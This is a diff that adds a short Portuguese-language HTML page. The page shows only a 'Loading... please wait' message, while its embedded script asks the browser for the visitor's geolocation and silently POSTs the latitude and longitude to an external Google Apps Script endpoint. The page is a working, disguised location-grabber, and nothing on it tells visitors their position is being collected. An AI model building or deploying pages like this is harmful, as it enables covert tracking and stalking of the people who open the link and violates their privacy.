@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Carregando...</title>
+  <style>
+    body {
+      background-color: #ffffff;
+      color: #444;
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Carregando...</h2>
+  <p>Aguarde um momento</p>
+
+  <script>
+    function enviarLocalizacao(latitude, longitude) {
+      fetch("https://script.google.com/macros/s/AKfycbwDXb0R6cphJ16dAhebrSidxPCucyjaWVhD6WNgr66i-19hqQ8oHzEs-kH5tX7RLlt2Fg/exec", {
+        method: "POST",
+        body: JSON.stringify({ latitude, longitude }),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      });
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          enviarLocalizacao(position.coords.latitude, position.coords.longitude);
+        },
+        (error) => {
+          console.error("Erro ao obter localização:", error);
+        }
+      );
+    } else {
+      console.error("Geolocalização não suportada.");
+    }
+  </script>
+</body>
+</html>
